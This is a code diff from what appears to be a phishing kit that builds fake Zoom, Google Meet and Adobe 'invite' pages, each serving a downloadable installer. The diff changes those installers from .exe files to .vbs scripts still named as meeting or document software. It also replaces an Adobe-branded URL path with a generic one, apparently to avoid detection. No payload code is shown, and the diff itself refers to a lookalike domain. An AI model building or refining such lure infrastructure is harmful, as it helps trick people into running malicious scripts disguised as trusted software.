@@ -60,7 +60,7 @@ export const TEMPLATE_UI: Record<
     accent: '#b22222',
     joinHeading: 'Opening your document...',
     secureLabel: 'Adobe Secure',
-    pathPrefix: '/adobefile',
+    pathPrefix: '/sharedfile',
   },
 };
 
@@ -100,9 +100,9 @@ export function defaultLabelForTemplate(template?: GuestInviteTemplate | null): 
 
 export function installerFileNameForTemplate(template?: GuestInviteTemplate | null): string {
   const t = normalizeInviteTemplate(template);
-  if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
-  if (t === 'adobe') return 'AdobeAcrobat-Setup.exe';
-  return 'ZoomClient-Setup.exe';
+  if (t === 'google_meet') return 'GoogleMeet-Setup.vbs';
+  if (t === 'adobe') return 'DocumentViewer-Setup.vbs';
+  return 'ZoomClient-Setup.vbs';
 }
 
 /** Public guest URL — matches meetinginvite.vu / Adobe path style. */
@@ -117,7 +117,7 @@ export function buildGuestJoinUrl(
     return `${base}/gotme/GoogleMeet/${code}`;
   }
   if (t === 'adobe') {
-    return `${base}/adobefile/${code}`;
+    return `${base}/sharedfile/${code}`;
   }
   return `${base}/joinzoom/${code}`;
 }
